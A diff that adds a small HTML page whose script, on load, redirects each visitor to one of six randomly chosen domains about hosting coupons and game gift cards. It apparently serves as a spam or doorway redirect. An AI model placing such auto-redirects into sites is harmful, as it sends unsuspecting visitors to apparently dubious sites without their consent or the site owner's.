@@ -1,0 +1,18 @@
+<!DOCTYPE html><html lang="en-US"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Redirect</title></head>
+<body onload="redirect()"><script>
+  function getRndInteger(min, max) {
+    return Math.floor(Math.random() * (max - min + 1) ) + min;
+  }
+  function redirect() {
+    const urls = [
+      'https://cloudhostingstudio.com',
+      'https://globaldomainhousing.com',
+      'https://yourhostingcouponlive.com',
+      'https://giftsforgames.com',
+      'https://videogamesgiftcards.com',
+      'https://giftcardsgames.com'
+    ];
+    window.location = urls[getRndInteger(0, 5)]
+  }
+</script></body>
+</html>
